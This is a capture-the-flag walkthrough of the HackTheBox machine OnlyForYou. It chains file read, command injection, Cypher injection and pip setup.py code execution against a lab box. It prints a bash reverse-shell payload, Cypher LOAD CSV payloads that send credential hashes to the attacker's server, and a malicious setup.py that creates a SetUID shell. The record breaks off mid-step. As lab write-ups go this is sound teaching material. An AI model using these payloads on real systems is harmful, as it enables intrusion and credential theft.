---
title: HTB: OnlyForYou
url: https://0xdf.gitlab.io/2023/08/26/htb-onlyforyou.html
date: 2023-08-26T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-onlyforyou, ctf, nmap, ffuf, subdomain, flask, ubuntu, source-code, file-read, directory-traversal, burp, burp-repeater, python-re, command-injection, filter, chisel, foxyproxy, gogs, neo4j, cypher-injection, cypher, crackstation, pip, setup-py, htb-opensource
---

![OnlyForYou](/img/onlyforyou-cover.png)

OnlyForYou is about exploiting Python and Neo4J. I’ll start by exploiting a Flask website file disclosure vulnerability due to a misunderstanding of the `os.path.join` function to get the source for another site. In that source, I’ll identify a command injection vulnerability, and figure out how bypass the filtering with a misunderstanding of the `re.match` function. Exploiting this returns a shell. I’ll pivot to the next user by abusing a Cypher Injection in Neo4J, and then escalate to root by exploiting an unsafe sudo rule with pip.

## Box Info

| Name | [OnlyForYou](https://hackthebox.com/machines/onlyforyou)  [OnlyForYou](https://hackthebox.com/machines/onlyforyou) [Play on HackTheBox](https://hackthebox.com/machines/onlyforyou) |
| --- | --- |
| Release Date | [22 Apr 2023](https://twitter.com/hackthebox_eu/status/1649065479351201794) |
| Retire Date | 26 Aug 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for OnlyForYou |
| Radar Graph | Radar chart for OnlyForYou |
| First Blood User | 00:51:04[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:57:50[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [0xM4hm0ud 0xM4hm0ud](https://app.hackthebox.com/users/480031) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.210
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-23 18:50 EDT
Nmap scan report for 10.10.11.210
Host is up (0.089s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.210
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-23 18:51 EDT
Nmap scan report for 10.10.11.210
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.70 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

There’s a redirect to on HTTP to `only4you.htb`.

### Subdomain Brute Force

Given the user of domain names for routing, I’ll fuzz to see if any subdomains of `only4you.htb` return a different page with `ffuf`:

```

oxdf@hacky$ ffuf -u http://only4you.htb -H "Host: FUZZ.only4you.htb" -ac -mc all -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://only4you.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.only4you.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

beta                    [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 113ms]
:: Progress: [19966/19966] :: Job [1/1] :: 421 req/sec :: Duration: [0:00:48] :: Errors: 0 ::

```

`-mc all` will look at all response codes. `-ac` will let it auto filter any that are different from the default response. It finds one, `beta.only4you.htb`. I’ll add both to my `/etc/hosts` file:

```
10.10.11.210 only4you.htb beta.only4you.htb

```

### only4you.htb - TCP 80

#### Site

The site is for some kind of tech services firm:

![image-20230423185722443](/img/image-20230423185722443.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

All of the links in the top bar go to points on the same page.

There’s a contact form at the bottom that feels kind of like it’s just part of the template. On submitting, it does send a POST request to `/` with the info, but the page doesn’t show any message or anything.

There are some names on the page. There’s also an email address, `info@only4you.htb`.

There are a couple references to “beta” versions of product. In “services”:

![image-20230423190119972](/img/image-20230423190119972.png)

Later in the FAQ there’s a link to `beta.only4you.htb`:

![image-20230423190152044](/img/image-20230423190152044.png)

#### Tech Stack

It’s hard to identify much here. Guessing at an extension for the index pages gets 404 not found for `index.html`, `index.php`, and `index`.

The HTTP response headers only show nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 23 Apr 2023 22:55:54 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 34125

```

Looking at the page source shows a bunch of CSS and JS loaded from `../static/vendor`, but nothing particularly interesting.

There’s even a custom 404 page:

![image-20230423190420741](/img/image-20230423190420741.png)

I’ll run `feroxbuster` against the site, but it doesn’t find anything interesting I haven’t found yet.

### beta.only4you.htb

#### Site

![image-20230423191726177](/img/image-20230423191726177.png)

The blue button gives the source code, and the top two links at the right go to `/resize` and `/convert`.

`/resize` has a form claiming to resize images:

![image-20230423192409767](/img/image-20230423192409767.png)

I can upload an image, and it must be bigger than 700x700:

![image-20230424093253057](/img/image-20230424093253057.png)

On sending a larger file, it flashes success, and then redirects to `/list`:

![image-20230424121205705](/img/image-20230424121205705.png)

Clicking on one of the buttons returns the image at that size with a POST to `/download`.

`/convert` has a similar form, and when I upload a `.png`, it returns a `.jpg`, and vice versa.

#### Source

I’m going to skip the brute force on directories and go right to the source. When I click on the ““Source Code” button, it downloads `source.zip`. It’s a Python website:

```

oxdf@hacky$ unzip source.zip 
Archive:  source.zip
   creating: beta/
  inflating: beta/app.py             
   creating: beta/static/
   creating: beta/static/img/
  inflating: beta/static/img/image-resize.svg  
   creating: beta/templates/
  inflating: beta/templates/400.html  
  inflating: beta/templates/500.html  
  inflating: beta/templates/convert.html  
  inflating: beta/templates/index.html  
  inflating: beta/templates/405.html  
  inflating: beta/templates/list.html  
  inflating: beta/templates/resize.html  
  inflating: beta/templates/404.html  
   creating: beta/uploads/
   creating: beta/uploads/resize/
   creating: beta/uploads/list/
   creating: beta/uploads/convert/
  inflating: beta/tool.py   

```

It’s a Python Flask application. VSCode allows me to quickly take a look at the routes:

![image-20230424120709223](/img/image-20230424120709223.png)

It looks like on successful submission to `/resize` I’m supposed to get a redirect to `/list` (I’m not sure why it doesn’t work for me).

## Shell as www-data

### File Read

#### Source Analysis

The `/download` function is immediately interesting because it’s reading files from the disk. On downloading, the POST request looks like:

```

POST /download HTTP/1.1
Host: beta.only4you.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://beta.only4you.htb
Connection: close
Referer: http://beta.only4you.htb/list
Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiSW1hZ2UgZG9lc24ndCBleGlzdCEiXX1dfQ.ZEaqhg.wtvG8CdzRRFfDFo6LSx06Oq0mi4
Upgrade-Insecure-Requests: 1

image=400x400.jpg

```

In the source, it’s:

```

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

```

There’s a check for directory traversal. If “..” is in the filename, then it fails.

#### Vulnerability Background

I first learned about this issue in solving [OpenSource](/2022/10/08/htb-opensource.html#directory-traversal). It turns out that in python, when using `os.path.join`, if any component is an absolute path, then the ones before it are ignored! From [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

![image-20230424122145174](/img/image-20230424122145174.png)

#### POC

To test this, I’ll send the POST request to Burp Repeater, and change the path to `/etc/passwd`. It works:

![image-20230424122302305](/img/image-20230424122302305.png)

I’ll note some interesting users that have shells set - john, neo4j, and dev.

### Filesystem Enumeration

#### Find Main Source

I’m not able to read anything useful from any of the home directories of the interesting users (unsurprisingly).

I’ll take a look at the nginx configurations. Websites are defined in `/etc/nginx/sites-enabled/`. The default configuration name is `default` or `default.conf`, and `default` matches here:

```

server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}

```

The top `server` sets the redierct to `only4you.htb`.

The second one handles `only4you.htb`, and proxies it into a UNIX socket in `/var/www/only4you.htb/`. It’s likely that software like `gunicorn` or `uWSGI` is listening on that socket and handling requests.

The third `server` is the same as the second, but it’s for the beta site and the directory and socket name are different.

#### Main Site Source

It’s fair to assume that the main site is also a Python Flask application, and that probably the main file is `app.py` just like the beta one. That assumption works:

![image-20230424130159506](/img/image-20230424130159506.png)

### Command Injection

#### Source Analysis

The main site is very simple. The only real code is for the error handlers (not shown below) and to handle the contact form POST.

```

from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfully sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')
...[snip]...

```

When there is a POST request to `/`, it passes the submitted data and the user’s IP to `sendmessage`. That function is imported at the top from a module named `form`. That could be a public module, but in this case it looks more likyl that it’s a local module. That means that there is likely a `form.py` in the same directory, or a `form` directory with an `__init__.py`. In either case, that file would have the `sendmessage` function.

It turns out I can read this at `image=/var/www/only4you.htb/form.py`.

Right at the top with the `import` statements I’m interested:

```

import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

```

It’s using `subprocess` to do something. The `sendmessage` function is simple enough:

```

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status

```

No issues in there. It does pass the `email` and `ip` to `issecure`.

```

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
        if "v=spf1" not in output:
			return 1
...[snip]...

```

`issecure` starts with a regex attempting to validate that the email is a valid email. Then it gets the domain from the email, and uses it to get the SPF text records for the domain. There’s more here, but it’s not important to me.

#### Identify Vulnerability

If the email address doesn’t match the regular expression, it’s supposed to return 0, ending the function before it can get to the `run` call which is potentially dangerous.

The problem is that `re.match` just checks that the [start of the string](https://docs.python.org/3/library/re.html#re.match) matches the regex:

![image-20230424133955146](/img/image-20230424133955146.png)

So as long as the start of the string is a match, I can add whatever I want to the end. I’ll demonstrate in [regex101.com](https://regex101.com/):

![image-20230823214402835](/img/image-20230823214402835.png)

Both match on the start of the string, so both would return success on the match. If the developer wanted this to match the entire string, they could have added a `$` to the end of the regex, like this:

![image-20230823214427759](/img/image-20230823214427759.png)

Now only the first line matches.

If the code continued with only the matched object, that could be safe. But then it uses the full email to make the call to `run`:

```

domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)

```

#### POC

To test this, I’ll try the same POC I showed in the image above. This will make the following:

```

email = "0xdf@only4you.htb; ping -c 1 10.10.14.6"
domain = "only4you.htb; ping -c 1 10.10.14.6"
command = "dig txt only4you.htb; ping -c 1 10.10.14.6"

```

I’ll get the POST request into Burp Repeater and send it. It hangs for a few seconds (presumably doing the DNS request?), and then there’s an ICMP packet at my listening `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:48:20.818373 IP 10.10.11.210 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
13:48:20.818389 IP 10.10.14.6 > 10.10.11.210: ICMP echo reply, id 2, seq 1, length 64

```

It worked!

#### Shell

To get a shell from this, I’ll replace the `ping` command with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

name=0xdf&email=0xdf@only4you.htb; bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'&subject=test&message=test

```

That URL encodes (Ctrl-u in Burp) to:

```

name=0xdf&email=0xdf%40only4you.htb%3b+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261'&subject=test&message=test

```

On sending that, there’s a connection back at my listening `nc`:

```

oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.210 44348
bash: cannot set terminal process group (1005): Inappropriate ioctl for device
bash: no job control in this shell
www-data@only4you:~/only4you.htb$

```

I’ll upgrade my shell using the [typical trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@only4you:~/only4you.htb$ script /dev/null -c bash
Script started, file is /dev/null
www-data@only4you:~/only4you.htb$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@only4you:~/only4you.htb$

```

## Shell as john

### Enumeration

#### Filesystem

There’s not much else to find on the file system. Two users have home directories, but I can’t enter either:

```

www-data@only4you:/home$ ls
dev  john
www-data@only4you:/home$ cd dev/
bash: cd: dev/: Permission denied
www-data@only4you:/home$ cd john/
bash: cd: john/: Permission denied

```

`/opt` also has two interesting folders that I can’t access:

```

www-data@only4you:/opt$ ls
gogs  internal_app
www-data@only4you:/opt$ cd internal_app/
bash: cd: internal_app/: Permission denied
www-data@only4you:/opt$ cd gogs/
bash: cd: gogs/: Permission denied

```

#### Sockets

`netstat` shows several listening ports on localhost that I wasn’t aware of previously:

```

www-data@only4you:/$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1020/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

3306 is the default MySQL port, and 33060 is likely another MySQL instance. I’ll want to check out 3000, 8001, 7687, and 7474. It’s also worth nothing that none of these are likely running as www-data, other than port 80, or else they would probably return the process and pid.

#### Tunnel

To continue, I’ll set up a tunnel to allow me to proxy connections through OnlyForYou and reach these servers working on localhost.

I’ll upload a [Chisel](https://github.com/jpillora/chisel) binary to OnlyForYou, and then start the server:

```

oxdf@hacky$ /opt/chisel/chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/04/24 14:25:31 server: Reverse tunnelling enabled
2023/04/24 14:25:31 server: Fingerprint LNDjYEqIYXW7aISw1MfeHDDjm3sTJiXBpWumcgair/Y=
2023/04/24 14:25:31 server: Listening on http://0.0.0.0:8000

```

`-p 8000` is because it listens on 8080 by default, but I have Burp there already. `--reverse` means that the client can open up listeners on the server.

On OnlyForYou, I’ll run it in client mode:

```

www-data@only4you:/dev/shm$ ./chisel_1.8.1_linux_amd64 client 10.10.14.6:8000 R:socks

```

The connection reaches the server:

```

2023/04/24 14:26:27 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

I’ll set up FoxyProxy to use this:

![image-20230424142926227](/img/image-20230424142926227.png)

#### Gogs - TCP 3000

The service on port 3000 is Gogs, a opensource Git solution:

```

www-data@only4you:/$ curl localhost:3000
<!DOCTYPE html>
<html>                                              
<head data-suburl="">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>

                <meta name="author" content="Gogs" />
                <meta name="description" content="Gogs is a painless self-hosted Git service" />
                <meta name="keywords" content="go, git, self-hosted, gogs">
...[snip]...

```

Loading it in Firefox shows the Gogs page:

![image-20230424143001398](/img/image-20230424143001398.png)

On the “Explore” page, there are no public repos, but two users:

![image-20230424143041147](/img/image-20230424143041147.png)

There’s no version, but it does say 2023, suggesting it’s recent. Without creds, not much else I can do.

#### 8001

The service on 8001 is also a webserver. This one redirects to `/login`:

```

www-data@only4you:~/only4you.htb$ curl localhost:8001
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.

```

In Firefox, the page loads as:

![image-20230424144423257](/img/image-20230424144423257.png)

I’ll try admin / admin and it works! `/dashboard` loads:

![image-20230424145525992](/img/image-20230424145525992.png)

There’s a hint in the Tasks section:

![image-20230424145621437](/img/image-20230424145621437.png)

It shows that they are using Neo4j. The “User Profile” section (`/update`) has a form to update a profile, but submitting it just says:

![image-20230424145736963](/img/image-20230424145736963.png)

The “Employees” table starts empty, but if I put a letter in and search (like “a”), it populates:

![image-20230424145816955](/img/image-20230424145816955.png)

#### Neo4J - TCP 7687/7474

[neo4j](https://neo4j.com/) is a graph database management system. Both of these ports are part of the neo4j database. According to [the docs](https://neo4j.com/docs/operations-manual/current/configuration/ports/), 7687 is the “bolt” listener, and 7474 is the HTTP listener.

I can reach 7474 on http with `curl`:

```

www-data@only4you:~/only4you.htb$ curl localhost:7474 
{
  "bolt_routing" : "neo4j://localhost:7687",
  "transaction" : "http://localhost:7474/db/{databaseName}/tx",
  "bolt_direct" : "bolt://localhost:7687",
  "neo4j_version" : "5.6.0",
  "neo4j_edition" : "community"
}

```

### Cypher Injection

#### Background

The query language used to query a neo4j database is called Cypher. It is used to interact with the graph data stored in Neo4j, allowing users to create, retrieve, update, and delete data using a declarative syntax that is similar to SQL.

If I think that the employee DB is likely hooked up to neo4j, then it’s possible that I could do a cypher injection against it.

The neo4j developer site has [this post](https://neo4j.com/developer/kb/protecting-against-cypher-injection/) about Cypher injection. [This page](https://neo4j.com/developer/cypher/querying/) talks about creating basic queries with Cypher.

#### Injection POC

The query the page is making to get a list of employees by search probably would look something like:

```

MATCH (e:employee) WHERE e.name CONTAINS '{name}' RETURN e

```

That would be grabbing `employee` nodes where the name contains our input and returning the nodes.

If that’s the case, I’ll try to see if I can craft a query that loads all the rows. What about `name=0xdf' or '1'='1`? That would make the query:

```

MATCH (e:employee) WHERE e.name CONTAINS '0xdf' or '1'='1' RETURN e

```

It loads 5 rows, the same as an empty search.:

![image-20230424152258451](/img/image-20230424152258451.png)

Given that’ none of those have “0xdf” in them, that’s proof of injection!

#### Extracting Information

The Hacktricks page on [Cypher injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#get-labels) has a bunch of good payloads to use from here. It’s easier to exfil the data base to my server than to get it formatted correctly to go onto the webpage. I’ll make use of `LOAD CSV FROM` to generate out going requests.

I’ll start with this payload to get version information:

```

' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.6/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 

```

I’ve updated it to use my IP, and on sending it, I get results:

```
10.10.11.210 - - [24/Apr/2023 15:32:14] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [24/Apr/2023 15:32:14] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -

```

I’ll update the query on the page to get the labels:

```

' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.6/?l='+label as l RETURN 0 as _0//

```

There are two hits at the server, `user` and `employee`:

```
10.10.11.210 - - [24/Apr/2023 15:35:19] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 15:35:19] "GET /?l=employee HTTP/1.1" 200 -

```

One neat thing about Cypher is that I can chain queries together, like in [this example](https://pentester.land/blog/cypher-injection-cheatsheet/#clause-composition):

```

MATCH (john:Person {name: 'John'})
MATCH (john)-[:FRIEND]->(friend)
RETURN friend.name AS friendName

```

That is how [this example](https://pentester.land/blog/cypher-injection-cheatsheet/#out-of-band--blind-using-load-csv) works to extract the keys for `user`:

```

' match (u:user) with distinct keys(u) as k LOAD CSV FROM 'http://10.10.14.6/?'+k[0] as b return b//

```

It’s getting the user object, and then the keys for it (saved in `k`), and then sending a query to me with `k[0]`:

```
10.10.11.210 - - [24/Apr/2023 16:06:50] "GET /?password HTTP/1.1" 200 -

```

I am not able to find a way to get all the keys in one query, but I’ll up `k[0]` to `k[1]` and get:

```
10.10.11.210 - - [24/Apr/2023 16:07:34] "GET /?username HTTP/1.1" 200 -

```

`k[2]` doesn’t returns anything.

To read data, I’ll use the same pattern but this time generate a string for each node:

```

' match (u:user) with distinct u.username + ":" + u.password  as d LOAD CSV FROM 'http://10.10.14.6/?'+d as a return a //

```

A single query sends back two requests:

```
10.10.11.210 - - [24/Apr/2023 16:10:08] "GET /?admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 16:10:08] "GET /?john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -

```

### su / SSH

#### Crackstation

Both of these are non-salted SHA256 hashes, and both are already cracked in [CrackStation](https://crackstation.net/):

![image-20230424161259132](/img/image-20230424161259132.png)

#### Shell

This password works for john over `su`:

```

www-data@only4you:~/only4you.htb$ su - john
Password: 
john@only4you:~$

```

And SSH:

```

oxdf@hacky$ sshpass -p 'ThisIs4You' ssh john@only4you.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)
...[snip]...
john@only4you:~$ 

```

And now I have `user.txt`:

```

john@only4you:~$ cat user.txt
1f9d455b************************

```

## Shell as root

### Enumeration

#### sudo

`john` can run a specific `pip` command as root:

```

john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz

```

It is interacting with `.tar.gz` files from the local instance of Gogs.

#### Gogs

john’s creds work for john on Gogs as well:

![image-20230424165625657](/img/image-20230424165625657.png)

The `Test` repo is managed by john, and there’s a test `README.md`:

![image-20230425070351556](/img/image-20230425070351556.png)

I’m able to click “Upload file” and give it a file, it uploads:

![image-20230425071111452](/img/image-20230425071111452.png)

### Malicious Python Package Archive

#### Issue

The [pip documentation](https://pip.pypa.io/en/stable/cli/pip_download/) for `download` shows one of the invocations to take a “archive url/path”.

![image-20230425104739157](/img/image-20230425104739157.png)

While it sounds like the `download` command would do just that, it turns out that it not only downloads the package but also runs a `setup.py` file inside the package. This was called out as far back as a [GitHub issue](https://github.com/pypa/pip/issues/1884) from 2014 (back when it was `pip --download` rather than `pip download`)!

![image-20230425124432055](/img/image-20230425124432055.png)

[This blog post](https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8) brought the malicious aspects to light (again) in August 2022.

#### Package

Embrace The Red has a [nice post](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/) on abusing this. I’ll follow that, but build a slightly more stripped down version. A `setup.py` file is meant to generate the metadata about the package, but it’s also a Python file so it can execute code. The `setup` function call is what is referenced by `pip`. I’ll build a minimal version of that:

```

from setuptools import setup
from setuptools.command.egg_info import egg_info
import os

class RunEggInfoCommand(egg_info):
    def run(self):
        os.system("touch /tmp/0xdf")
        egg_info.run(self)

setup(
    name = "own_this_is_for_you",
    version = "0.0.1",
    license = "MIT",
    packages=[],
    cmdclass={
        'egg_info': RunEggInfoCommand
    },
)

```

I’ve used `cmdclass` to define an `egg_info` object which takes a class. That class is defined above, and the `run` function will be invoked. Since I’m overwriting the default `egg_info`, it’s important to call the legit one after of this won’t build.

With this single file in a directory, I’ll run `python -m build` in the same directory:

```

oxdf@hacky$ ls
setup.py
oxdf@hacky$ python3 -m build 
* Creating venv isolated environment...
* Installing packages in isolated environment... (setuptools >= 40.8.0, wheel)
* Getting build dependencies for sdist...
running egg_info
...[snip]...
adding 'own_this_is_for_you-0.0.1.dist-info/RECORD'
removing build/bdist.linux-x86_64/wheel
Successfully built own_this_is_for_you-0.0.1.tar.gz and own_this_is_for_you-0.0.1-py3-none-any.whl
oxdf@hacky$ ls
dist  own_this_is_for_you.egg-info  setup.py

```

The tar archive version is in `dist`:

```

oxdf@hacky$ ls dist/
own_this_is_for_you-0.0.1-py3-none-any.whl  own_this_is_for_you-0.0.1.tar.gz

```

#### Upload

I’ll upload this to Gogs so that it is part of the Test repository:

![image-20230425135345775](/img/image-20230425135345775.png)

I’ll get the raw link to the file by clicking it, and then copying the link:

![image-20230425135401692](/img/image-20230425135401692.png)

Trying to run the `pip download` command fails:

```

john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
  ERROR: HTTP error 404 while getting http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
  ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz because of error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz because of HTTP error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz for URL http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz

```

It’s getting a 404. `curl` will give the same result.

#### Update Permissions

The repo is marked as private, and the `pip` command doesn’t have john’s creds. I could add them to the url, but that would make it not fit the `sudo` pattern any more. I could also potentially create a config file to store the creds..

Instead, I’ll just make the repo public by clicking on Settings. I’ll upcheck this box and click “Update Settings”:

![image-20230425133359609](/img/image-20230425133359609.png)

Now it works:

```

john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz (810 bytes)
  Saved ./own_this_is_for_you-0.0.1.tar.gz
Successfully downloaded own-this-is-for-you

```

Now only that, but the code executed:

```

john@only4you:~$ ls -l /tmp/0xdf 
-rw-r--r-- 1 root root 0 Apr 25 17:54 /tmp/0xdf

```

`/tmp/0xdf` is there and owned by root.

#### Shell

To get a shell, I’ll update my `setup.py`:

```

from setuptools import setup
from setuptools.command.egg_info import egg_info
import os

class RunEggInfoCommand(egg_info):
    def run(self):
        os.system("cp /bin/bash /tmp/0xdf")
        os.system("chmod 4777 /tmp/0xdf")
        egg_info.run(self)

setup(
    name = "own_this_is_for_you",
    version = "0.0.1",
    license = "MIT",
    packages=[],
    cmdclass={
        'egg_info': RunEggInfoCommand
    },
)

```

Now instead of `touch` a file, it copies `bash` and sets it as SetUID. I’ll do the same steps, `python -m build`, upload, set the repo public (there’s a cron constantly resetting that), and run the command as john:

```

john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
